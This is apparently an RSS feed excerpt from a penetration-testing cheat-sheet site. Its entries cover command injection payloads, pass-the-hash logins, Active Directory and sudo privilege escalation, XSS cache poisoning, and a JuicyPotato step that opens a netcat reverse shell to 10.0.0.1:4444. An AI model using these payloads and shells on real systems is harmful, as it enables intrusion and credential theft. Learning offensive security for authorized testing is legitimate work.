      <description>Impacket PsExec linkPsExec gives us an interactive shell on the Windows host.&#xA;impacket-psexec username:password@&amp;lt;target-ip&amp;gt; # Pass the Hashes impacket-psexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d username@10.0.0.1 Impacket WmiExec linkWmiExec uses Windows Management Instrumentation (WMI) to give us an interactive shell on the Windows host.&#xA;impacket-wmiexec example.local/username@10.0.0.1 # Pass the Hashes impacket-wmiexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d example.local/username@10.0.0.1 </description>
    </item>
    <item>
      <title>OS Command Injection</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/os-command-injection/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/os-command-injection/</guid>
      <description>Basic Payloads linkIf the payload includes whitespaces (&amp;rsquo; &amp;lsquo;), we need to change it to &amp;rsquo;+&amp;rsquo; or URL encoding (&amp;rsquo;%20&amp;rsquo;).&#xA;/api/cmd/whoami /command/whoami /?cmd=whoami /?cmd=;id /?cmd=ls /?cmd=ls .. /?cmd=ls ../ /?cmd=ls /home /?cmd=`ping -c 1 10.0.0.1` /?file=example.txt; echo $(ls -al /) /?file=example.txt; echo $(ls -al /) | &amp;lt;!-- PHP query string --&amp;gt; /?q=;system($_GET[cmd])&amp;amp;cmd=whoami /?q=${system($_GET[cmd])}&amp;amp;cmd=whoami /?productId=1&amp;amp;stockId=1|whoami /?productId=1&amp;amp;stockId=1|id &amp;lt;!-- Windows --&amp;gt; /?file=example.txt | systeminfo # /?file=example.txt ; systeminfo # /?file=example.txt&amp;#39;) ; systeminfo # URL Encoding linkWe may be able to bypass specific character filter by encoding them.</description>
    </item>
    <item>
      <title>Web Basic Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/web-basic-pentesting/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/web-basic-pentesting/</guid>
      <description>Enumeration link # Nmap nmap --script http-auth --script-args http-auth.path=/login -p 80,443 &amp;lt;target-ip&amp;gt; nmap --script http-devframework -p 80,443 &amp;lt;target-ip&amp;gt; nmap --script http-enum -p 80,443 &amp;lt;target-ip&amp;gt; nmap --script http-headers -p 80,443 &amp;lt;target-ip&amp;gt; nmap --script http-methods -p 80,443 &amp;lt;target-ip&amp;gt; # WHOIS whois example.com # Nikto nikto -h http://&amp;lt;target-ip&amp;gt; # -p: Specify ports nikto -p 80,3000 -h &amp;lt;target-ip&amp;gt; # -T: Tuning # 1: Interesting files # 2: Misconfiguration # 3: Information Disclosure # 4: Injection (XSS/Script/HTML) nikto -T 1 2 3 -h &amp;lt;target-ip&amp;gt; # -useragent: Custom user agent nikto -useragent &amp;lt;user-agent&amp;gt; -h &amp;lt;target-ip&amp;gt; # -e: IDS evasion # 1: Random URI encoding # 7: Change the case of URL nikto -e 1 7 -h &amp;lt;target-ip&amp;gt; # Whatweb whatweb &amp;lt;target-ip&amp;gt; # Aggression level (1-4) whatweb -a 3 &amp;lt;target-ip&amp;gt; # List all plugins whatweb -l # Search plugins whatweb -I apache whatweb -I phpBB whatweb -I phpmyadmin whatweb -I windows # Use plugin whatweb -p phpBB &amp;lt;target-ip&amp;gt; SSL Certificate linkIt may contain the sensitive information about the target company.</description>
    </item>
    <item>
      <title>Web Registration Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/web-registration-attack/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/web-registration-attack/</guid>
      <description>Register with the Same Username/Email Address as Existing User linkWe might be able to register the same username/email address as the existing user. It may affect the web server so be careful when testing.&#xA;Here are examples of username to register.&#xA;admin administrator root Alternatively, it’s worth to try various approach to register.&#xA;# Insert null byte admin%00 # Insert a space before username admin %20admin # Insert a space after username admin admin%20 # Insert spaces around username admin %20admin%20 # Overflow (we need to find the longest characters that can be registered) xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxadmin Malicious Usernames linkXSS linkWe might be able to inject XSS in username when registration.</description>
    </item>
    <item>
      <title>Windows PrivEsc with AD CS</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-adcs/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-adcs/</guid>
      <description>⚠️DISCLAIMER: I still don&amp;rsquo;t really understand AD CS, so it might be wrong. If so, please let me know via GitHub Issue or Pull Request.&#xA;Enumerate Certificate Templates linkCertificate templates are the rule set for AD CS. It contains CA name, CA permissions, etc. Some attributes are related to vulnerabilities to privilege escalation.&#xA;To enumerate them, we can use Certify or Certipy.&#xA;certipy find -u user@example.local -p password -dc-ip &amp;lt;target-ip&amp;gt; -stdout certipy find -vulnerable -u user@example.</description>
    </item>
    <item>
      <title>Windows PrivEsc with RemotePotato</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-remotepotato/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-remotepotato/</guid>
      <description>Exploit linkReference: RemotePotato0&#xA;According to the RemotePotato0&amp;rsquo;s README, it abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user).&#xA;We can download the executable from https://github.com/antonioCoco/RemotePotato0.&#xA;Module 0 (-m 0: Rpc2Http cross protocol relay server + potato trigger) link # In attack machine sudo socat tcp-listen:135,fork,reuseaddr tcp:&amp;lt;target-ip&amp;gt;:9999 &amp;amp; sudo ntlmrelayx.</description>
    </item>
    <item>
      <title>OSINT (Open Source Intelligence)</title>
      <link>https://documentnation.github.io/docs/hdks/reconnaissance/osint/</link>
      <pubDate>Fri, 03 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reconnaissance/osint/</guid>
      <description>Automation linkOSINT is a powerful method for investigating target organizations, websites, etc. However, it&amp;rsquo;s the tedious task to surfin the internet for finding desired information one by one. For that reason, it&amp;rsquo;s also recommended to use automation tools.&#xA;*It might overlap a bit with recon automation tools&#xA;BBOT&#xA;A powerful subdomain scanner and port mapper.&#xA;Blackbird&#xA;Searches accounts by username in social networks.&#xA;Maltego&#xA;A comprehensive tool for information gathering.</description>
    </item>
    <item>
      <title>Shell Scripting</title>
      <link>https://documentnation.github.io/docs/hdks/linux/management/shell-scripting/</link>
      <pubDate>Fri, 03 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/management/shell-scripting/</guid>
      <description>For Loop link #!/bin/bash for i in {1..5} do echo &amp;#34;Hello $i&amp;#34; done 4 Digits Loop link #!/bin/bash for i in {0000..9999} do echo $i done Read Text Line by Line linkread-text.sh&#xA;#!/bin/bash while read line do echo $line done &amp;lt; example.txt Retrieve Arguments linkGetopts is useful.&#xA;Create &amp;ldquo;my_opt.sh&amp;rdquo;.&#xA;#!/bin/bash getopts c cmd echo $cmd Run. This output is the current username.&#xA;./my_opt.sh -cwhoami While Loop and Retrieving Arguments&#xA;Create “my_while_opt.</description>
    </item>
    <item>
      <title>Add &amp; Delete Groups in Linux</title>
      <link>https://documentnation.github.io/docs/hdks/linux/management/add-and-delete-groups-in-linux/</link>
      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/management/add-and-delete-groups-in-linux/</guid>
      <description>Add/Delete Groups link # Add a group groupadd &amp;lt;group&amp;gt; # Delete a group groupdel &amp;lt;group&amp;gt; Add User to Group link # -a: Append the user to the specific group # -G: Group usermod -a -G &amp;lt;group&amp;gt; &amp;lt;user&amp;gt; # Change user&amp;#39;s primary group # -g: GID usermod -g &amp;lt;group&amp;gt; &amp;lt;user&amp;gt; Sudo Group linkUssers who belong to sudo group can execute commands with sudo. To add a user to the sudo group, run the following command.</description>
    </item>
    <item>
      <title>Add &amp; Delete Users in Linux</title>
      <link>https://documentnation.github.io/docs/hdks/linux/management/add-and-delete-user-in-linux/</link>
      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/management/add-and-delete-user-in-linux/</guid>
      <description>Add Users linkWe can use useradd or adduser command to add users in Linux.&#xA;useradd &amp;lt;user&amp;gt; adduser &amp;lt;user&amp;gt; # -p: Specify password useradd &amp;lt;user&amp;gt; -p &amp;lt;password&amp;gt; # -u: Specify UID # -g: Specify GID useradd -u 1000 -g 1000 &amp;lt;user&amp;gt; Set Password for User link # Set passwords. It&amp;#39;s stored in &amp;#34;/etc/shadow&amp;#34; passwd &amp;lt;user&amp;gt; Delete Users linkWe can use userdel or deluser command to delete users in Linux.&#xA;userdel &amp;lt;user&amp;gt; deluser &amp;lt;user&amp;gt; # -r: Remove home directory and mail spool userdel -r &amp;lt;user&amp;gt; List Users in Linux linkTo list users exist in Linux, run the following commands.</description>
    </item>
    <item>
      <title>File &amp; Directory Ownership in Linux</title>
      <link>https://documentnation.github.io/docs/hdks/linux/management/file-and-directory-ownership-in-linux/</link>
      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/management/file-and-directory-ownership-in-linux/</guid>
      <description>Change Ownership to Specific User link chown &amp;lt;user&amp;gt; &amp;lt;file&amp;gt; chown &amp;lt;user&amp;gt; &amp;lt;dir&amp;gt; # -R: Recursive chown -R &amp;lt;user&amp;gt; &amp;lt;dir&amp;gt; Examples link chown tester example.txt chown tester ./example chown -R tester ./example Change Ownership to Specific Group link chown :&amp;lt;group&amp;gt; &amp;lt;file&amp;gt; chown :&amp;lt;group&amp;gt; &amp;lt;dir&amp;gt; # -R: Recursive chown -R :&amp;lt;group&amp;gt; &amp;lt;dir&amp;gt; Examples link chown :testers example.txt chown :testers ./example chown -R :testers ./example Change Ownership to Specific User&amp;amp;Group linkWe can give ownership of file/directory to specific both use and group at the same time.</description>
    </item>
    <item>
      <title>File &amp; Directory Permission in Linux</title>
      <link>https://documentnation.github.io/docs/hdks/linux/management/file-and-directory-permission-in-linux/</link>
      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/management/file-and-directory-permission-in-linux/</guid>
      <description>Basic link Permission Number Character Read 4 r Write 2 w Execute 1 x We can use these value combination for changing permission.&#xA;For example,&#xA;Permission Number Character Read + Write + Execute 4+2+1=7 rwx Read + Write 4+2=6 rw Read 4 r Cheat Sheet linkRead/Write/Execute link Target Command User chmod 700 sample.txt chmod u+rwx sample.txt Group chmod 070 sample.txt chmod g+rwx sample.txt Others chmod 007 sample.txt chmod o+rwx sample.txt All chmod 777 sample.</description>
    </item>
    <item>
      <title>Google Dorks</title>
      <link>https://documentnation.github.io/docs/hdks/reconnaissance/google-dorks/</link>
      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reconnaissance/google-dorks/</guid>
      <description>Cache/Archive linkSearch the latest cached results.&#xA;cache:examle.com Country &amp;amp; Language linkIf we want to get search results with specific country and language, set parameters gl and hl.&#xA;# gl=us: United States # hl=en: English https://www.google.com/search?q=apple&amp;amp;gl=us&amp;amp;hl=en Directory Listing linkSearch websites which allow directory listings. We can retrieve all files if it&amp;rsquo;s enabled in websites.&#xA;intext: &amp;#34;Index of /admin&amp;#34; intext: &amp;#34;Index of /wp-admin&amp;#34; site:example.com intext: &amp;#34;Index of /admin&amp;#34; File Types linkSpecify the filetype e.</description>
    </item>
    <item>
      <title>Kerberos Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/kerberos-pentesting/</link>
      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/kerberos-pentesting/</guid>
      <description>Enumeration linkTo enumerate automatically, you can use nmap.&#xA;nmap --script krb5-enum-users --script-args krb5-enum-users.realm=&amp;#39;example.local&amp;#39;-p 88 &amp;lt;target-ip&amp;gt; Brute Force Authentication linkKerbrute is a tool to perform Kerberos pre-auth bruteforcing.&#xA;The wordlist (e.g. combos.txt) specified must be the &amp;ldquo;username:password&amp;rdquo; combinations.&#xA;# -v: verbose mode *it&amp;#39;s recommended to add this flag otherwise we cannot confirm if the user exist or not. # --dc: domain controller # -d: domain # combos.txt: the wordlist specified must be combinations with &amp;#34;username:password&amp;#34;.</description>
    </item>
    <item>
      <title>MSRPC (Microsoft Remote Procedure Call) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/protocol/msrpc-pentesting/</link>
      <pubDate>Thu, 26 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/protocol/msrpc-pentesting/</guid>
      <description>Enumeration link nmap --script msrpc-enum -p 135 &amp;lt;target-ip&amp;gt; # rpcdump for dumping RPC endpoints impacket-rpcdump -port 135 &amp;lt;target-ip&amp;gt; # Find the Print System Remote Prototol or the Print System Asynchronous Remote Protocol impacket-rpcdump -port 135 &amp;lt;target-ip&amp;gt; | grep -E &amp;#39;MS-RPRN|MS-PAR&amp;#39; If we found MS-RPRN or MS-PAR, we might be able to exploit with PrintNightmare.&#xA;Metasploit link msfconsole msf&amp;gt; use auxiliary/scanner/dcerpc/endpoint_mapper msf&amp;gt; use auxiliary/scanner/dcerpc/hidden msf&amp;gt; use auxiliary/scanner/dcerpc/management msf&amp;gt; use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor Investigation linkrpcinfo reports RPC information.</description>
    </item>
    <item>
      <title>Person Investigation</title>
      <link>https://documentnation.github.io/docs/hdks/reconnaissance/person-investigation/</link>
      <pubDate>Thu, 26 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reconnaissance/person-investigation/</guid>
      <description>Accounts in Social Media &amp;amp; Other Platforms linkThe target person may use some social media. So first check if the account exists in each platform.&#xA;Facebook GitHub Instagram Reddit Threads TikTok X (formerly Twitter) YoutTube Google Dorking linkAssume the target person named John Smith.&#xA;&amp;lt;social_media&amp;gt; john smith &amp;lt;social_media&amp;gt; jsmith &amp;lt;social_media&amp;gt; j.smith # add the year of birth &amp;lt;social_media&amp;gt; john1999 For example,&#xA;facebook jsmith reddit jsmith twitter jsmith IOSINT (Image OSINT) for Account Pictures linkIf the person sets the picture as user profile or posts, we can investigate the information about the image using IOSINT.</description>
    </item>
    <item>
      <title>Port Scan</title>
      <link>https://documentnation.github.io/docs/hdks/reconnaissance/port-scan/</link>
      <pubDate>Thu, 26 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reconnaissance/port-scan/</guid>
      <description>Nmap linkNmap is still the most commonly used tool when scanning ports of the target system.&#xA;But in recent years, some other tools, such as masscan or rustscan, are also becoming popular because the tools scan faster than nmap.&#xA;Basic Scan linkIt&amp;rsquo;s recommened to do as stealth scan (SYN scan) by adding the option -sS.&#xA;Also it&amp;rsquo;s prefered to add -T2 flag for being polite.&#xA;sudo nmap -sS &amp;lt;target-ip&amp;gt; sudo nmap -sS &amp;lt;target-ip&amp;gt; -T2 # -V: OS version detection # -C: Default NSE sudo nmap -sSVC &amp;lt;target-ip&amp;gt; # -A: All detection sudo nmap -sS -A &amp;lt;target-ip&amp;gt; Skipping the host discovery</description>
    </item>
    <item>
      <title>Sudo Privilege Escalation by Overriding Shared Library</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/</link>
      <pubDate>Thu, 26 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/</guid>
      <description>LD_PRELOAD, LD_LIBRARY_PATH Overwriting linkInvestigation linkCheck sudo commands.&#xA;sudo -l The below is the output example.&#xA;env_keep&amp;#43;=LD_PRELOAD (ALL : ALL) NOPASSWD: somecmd If we find the sudo command keeps LD_PRELOAD environment, we can overwrite this variable to load our custome shared object and escalate the privileges.&#xA;Also, we can replace the LD_PRELOAD with LD_LIBRARY_PATH.&#xA;By the way, to list shared libraries required by the executable, use ldd command.&#xA;ldd somecmd Exploitation linkFirst off, create exploit.</description>
    </item>
    <item>
      <title>Windows PrivEsc with LocalPotato</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-localpotato/</link>
      <pubDate>Thu, 26 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-localpotato/</guid>
      <description>GodPotato linkRequired Privileges link SeImpersonatePrivilege Payloads link https://github.com/BeichenDream/GodPotato GodPotato -cmd &amp;#34;cmd /c whoami&amp;#34; JuicyPotato linkRequired Privilege link SeImpersonatePrivilege or SeAssignPrimaryToken Payloads link https://github.com/antonioCoco/JuicyPotatoNG https://github.com/ohpe/juicy-potato Before exploiting, we need to upload nc.exe (it is available from here) to the target machine.&#xA;Invoke-WebRequest -Uri http://10.0.0.1:8000/nc.exe -OutFile c:\Temp\nc.exe Next start a listener in local machine.&#xA;nc -lvnp 4444 Then execute JuicyPotato in target machine.&#xA;JuicyPotatoNG.exe -t * -p &amp;#34;c:\Temp\nc.exe&amp;#34; -a &amp;#34;10.0.0.1 4444 -e cmd.</description>
    </item>
    <item>
      <title>AD CS (Active Directory Certificate Services) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/ad-cs-pentesting/</link>
      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/ad-cs-pentesting/</guid>
      <description>Enumeration linkWe can retrieve certificates information on target Windows machine using certutil.&#xA;# Dump general information certutil -dump # Dump information about certificate authority certutil -ca certutil -catemplates # List all templates certutil -template # specify the template certutil -template ExampleTemplate Then check if Allow Full Control or Allow Write include the group which current user belongs to. If so, we can modify the template and might be able to escalate privilege.</description>
    </item>
    <item>
      <title>BloodHound SharpHound for Active Directory</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/bloodhound-sharphound/</link>
      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/bloodhound-sharphound/</guid>
      <description>Enumerate Active Directory link1. Collect Information with Sharphound linkIn target machine, download SharpHound and run.&#xA;# Enumerate the AD information that can be visualized in Bloodhound Sharphound.exe --CollectionMethods All --Domain dc.example.com --ExcludeDCs Then the zip file will be generated. This file can be displayed in Bloodhound.&#xA;To transfer the zip file to local machine, run the following command in local machine.&#xA;scp &amp;lt;ad_username&amp;gt;@example.com:C:/Path/To/&amp;lt;sharphound_result&amp;gt;.zip . 2. Start Bloodhound linkIn local machine, start neo4j console.</description>
    </item>
    <item>
      <title>DACL (Discretionary Access Control List) Attack</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/dacl-attack/</link>
      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/dacl-attack/</guid>
      <description>Add Rights linkWe may be able to take a full control of securable objects by getting GenericAll permission on OU (Organizational Unit).&#xA;1. Ask TGT for Kerberos Authentication linkIf we want to use Kerberos authentication for attacking DACL, we need to retrieve a TGT for specific user at first. In addition, to avoid authentication error, we need to synchronize the system time with the domain controller using ntpdate or rdate.</description>
    </item>
    <item>
      <title>RBCD (Resource-Based Constrained Delegation) Attack</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/pbcd-attack/</link>
      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/pbcd-attack/</guid>
      <description>Exploit linkReference: https://github.com/tothi/rbcd-attack#abusing-kerberos-resource-based-constrained-delegation&#xA;0. Prerequisites linkTo achieve this attack successfully, we need the following conditions:&#xA;A domain account who has permission to write the computer (msDS-AllowedToActOnBehalfOfOtherIdentity property of the domain object). A domain account who has permission to create a new computer. LDAP (389) and SAMR (445) or LDAPS (636) access to the DC. Kerberos (88) access to the DC. 1. Create Fake Computer link impacket-addcomputer -computer-name &amp;#39;fakecomputer$&amp;#39; -computer-pass &amp;#39;password&amp;#39; -dc-ip 10.</description>
    </item>
    <item>
      <title>Windows PrivEsc with Kerberos</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-kerberos/</link>
      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-kerberos/</guid>
      <description>Privilege Escalation linkFirst off, download two PS scripts in local machine..&#xA;wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1 Then upload them to the target machine.&#xA;# Evil-WinRM upload PowerView.ps1 Import-Module .\PowerView.ps1 upload Powermad.ps1 Import-Module .\Powermad.ps1 1. Check User&amp;rsquo;s Permission and Windows Versions linkCheck if users are allowed to create a new computer object on the domain.&#xA;Get-DomainObject -Identity &amp;#34;dc=example,dc=com&amp;#34; -Domain example.com # ------------------------- # Result ms-ds-machineaccountquota: 10 And check if the machine is at least Windows Server 2012.</description>
    </item>
    <item>
      <title>WinRM (Windows Remote Management) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/protocol/winrm-pentesting/</link>
      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/protocol/winrm-pentesting/</guid>
      <description>Enumeration linkBrute Force Credentials link # CrackMapExec poetry run crackmapexec winrm &amp;lt;target-ip&amp;gt; -d DomainName -u usernames.txt -p passwords.txt # Metasploit msfconsole msf &amp;gt; use auxiliary/scanner/winrm/winrm_login Evil-WinRM linkEvil-WinRM is a Windows Remote Management shell for pentesting.&#xA;Below are list of commands for each situation.&#xA;Connect link evil-winrm -i &amp;lt;target-ip&amp;gt; -u username -p password # -P: Specifify port evil-winrm -i &amp;lt;target-ip&amp;gt; -P 5986 -u username -p password # Pass The Hash (-H) evil-winrm -i &amp;lt;target-ip&amp;gt; -P 5986 -u username -H 0e0363213e37b94221497260b0bcb4fc # PowerShell Local Path (-s) evil-winrm -i &amp;lt;target-ip&amp;gt; -u username -p password -s /opt/scripts # SSL enabled (-S) evil-winrm -i &amp;lt;target-ip&amp;gt; -u username -p password -S If you have private key and public key, you can use them for authentication.</description>
    </item>
    <item>
      <title>SSRF (Server-Side Request Forgery)</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/ssrf/</link>
      <pubDate>Wed, 18 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/ssrf/</guid>
      <description>SSRF Capture Tools linkIf we want to capture incoming requests from target website/server, there is a lot of open-source tools available.&#xA;Ngrok linkhttps://ngrok.com/&#xA;To start ngrok server, run the following.&#xA;ngrok http 80 # Force http scheme (not https) ngrok http --scheme=http 8090 --host-header=localhost:8090 Then start your local web server for fetching requests forwarded from the ngrok server.&#xA;sudo python3 -m http.server 80 # or python3 -m http.server 8090 After starting ngrok and local web server, we can use the URL such as https://abcd-12-3-45-678.</description>
    </item>
    <item>
      <title>SSTI (Server-Side Template Injection)</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/ssti/</link>
      <pubDate>Wed, 18 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/ssti/</guid>
      <description>Automation linkTplmap is a program for Server-Side Template Injection and Code Injection.&#xA;./tplmap.py -u http://vulnerable.com/?name=test Identify the Template Engine/Framework/Language link Payload Template Engine/Framework/Language a{*comment*}b Smarty #{ 2*3 } Pug, Spring *{ 2*3 } Spring ${&amp;quot;z&amp;quot;.join(&amp;quot;ab&amp;quot;)} Mako, ??? {{ &#39;7&#39;*7 }} Angular, Django, Flask, Go, Jinja2, Tornado, Twig, ??? {{:2*3}} JsRender {% debug %} Django SSTI for Each Framework linkPlease see each article for details about SSTI.&#xA;Angular Django Flask/Jinja2 Go JsRender Pug Spring Tornado </description>
    </item>
    <item>
      <title>Web Cache Poisoning</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/web-cache-poisoning/</link>
      <pubDate>Wed, 18 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/web-cache-poisoning/</guid>
      <description>Reflected XSS with Cache Poisoning linkIf the website reflects our arbitrary path in the result such as below.&#xA;https://example.com/xyz # Output in the 404 page Page not found: /xyz We may try XSS as below.&#xA;https://example.com/xyz&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; If we use Burp Repeater to send the request above, the URL won&amp;rsquo;t be normalized so leads the reflected XSS. Then the cache will be poisoned. In this state, if you ask the victim to visit this URL, they will see this cached result.</description>
    </item>
    <item>
      <title>Email Analysis</title>
      <link>https://documentnation.github.io/docs/hdks/reconnaissance/email-analysis/</link>
      <pubDate>Sat, 14 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/reconnaissance/email-analysis/</guid>
      <description>OSINT link InQuest Labs&#xA;Message Header Analyzer&#xA;Analyses message header of email. It helps to check the phishing emails.&#xA;PhishTool&#xA;Combines threat intelligence, OSINT, email metadata and battle tested auto-analysis pathways into one powerful phishing response platform.&#xA;Simple Email Reputation&#xA;Paste the sender’s email address to check if the address is suspicious.&#xA;VirusTotal&#xA;Email Source Analysis linkWe can see the email source in each provider or execute the following commands.</description>
    </item>
    <item>
      <title>Go SSTI</title>
      <link>https://documentnation.github.io/docs/hdks/web/go-ssti/</link>
      <pubDate>Sat, 14 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/go-ssti/</guid>
      <description>Investigation link import &amp;#34;html/template&amp;#34; ... template.New(&amp;#34;foo&amp;#34;).Parse(&amp;#34;{{ . }}&amp;#34;) If a website uses a web framework written in Golang and uses html/template module for parsing a template file or strings, we may inject this template with our custom template file/string.&#xA;Exploit linkAssume a web application defines User struct, GetFile method, and ExecuteCmd method.&#xA;// `main.go` of target website type User struct { Id string Name string } // Read contents of the file and output it.</description>
    </item>
    <item>
      <title>HTTP Request Smuggling</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/http-request-smuggling/</link>
      <pubDate>Sat, 14 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/http-request-smuggling/</guid>
      <description>Investigation linkAssume the website has the following HTTP specification.&#xA;POST /login HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded Content-Length: 29 username=admin&amp;amp;password=admin If we change &amp;ldquo;Content-Length&amp;rdquo; to &amp;ldquo;Transfer-Encoding&amp;rdquo; as follow, the data is sent in chunks to server. Each chunk consists of the chunk size in bytes (it is expressed in hexadecimal).&#xA;The message is terminated with a chunk of size zero.&#xA;POST /login HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded Transfer-Encoding: chunked 1d username=admin&amp;amp;password=admin 0 By the way, Transfer-Encoding header is not allowed in HTTP/2.</description>
    </item>
    <item>
      <title>Web Server Security Misconfiguration</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/web-server-security-misconfiguration/</link>
      <pubDate>Thu, 12 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/web-server-security-misconfiguration/</guid>
      <description>Checklist link The admin page allows non-admin users to access. Directory listing is enabled. Test environment is public. Default username and password. Admin’s password is easy to guess e.g. &amp;ldquo;admin&amp;rdquo;, &amp;ldquo;password123&amp;rdquo;, etc. The software is out of date or vulnerable version. Attacker-friendly error messages are displayed e.g. it reveals the software version. A cloud service provider (CSP) has default sharing permissions. Unsecure http protocol is used rather than https. Check CSP (Content-Security-Policy) linkWe can check if the CSP is vulnerable or not using online tools as below.</description>
    </item>
    <item>
      <title>NoSQL Injection</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/nosql-injection/</link>
      <pubDate>Thu, 05 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/nosql-injection/</guid>
